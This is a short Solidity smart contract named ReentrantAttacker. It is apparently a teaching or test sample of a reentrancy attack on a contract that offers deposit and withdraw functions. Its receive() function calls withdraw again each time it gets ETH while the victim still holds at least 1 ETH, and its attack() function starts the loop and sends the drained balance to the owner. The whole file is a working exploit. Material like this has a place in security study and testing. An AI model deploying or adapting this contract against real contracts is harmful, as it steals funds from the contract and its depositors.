// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

interface IVictim {
	function deposit() external payable;

	function withdraw(uint256 value) external;
}

contract ReentrantAttacker {
	address public victim;
	address public owner;

	event Attacked();
	event Successful(uint256 amount);

	constructor(address _victim) {
		owner = msg.sender;
		victim = _victim;
	}

	/**
	 * @dev This function will be triggered when this smart contract receives ETH from the victim.
	 * @dev It checks if the victim has a balance of more than or equal to 1 ETH.
	 * @dev If so, it will call withdraw() to withdraw 1 ETH from the victim again.
	 */
	receive() external payable {
		// reentrant logic
		if (victim.balance >= 1 ether) {
			IVictim(victim).withdraw(1 ether);
			emit Attacked();
		}
	}

	/**
	 * @dev The owner can trigger this function to attack the victim.
	 * @dev The owner will deposit 1 ETH to the victim and then withdraw the entire balance of the victim.
	 */
	function attack() external payable {
		require(msg.sender == owner, "Not owner");

		IVictim(victim).deposit{ value: msg.value }();
		IVictim(victim).withdraw(msg.value);

		uint256 balance = address(this).balance;

		(bool success, ) = payable(owner).call{ value: balance }("");
		require(success, "Transfer failed");

		emit Successful(balance);
	}
}
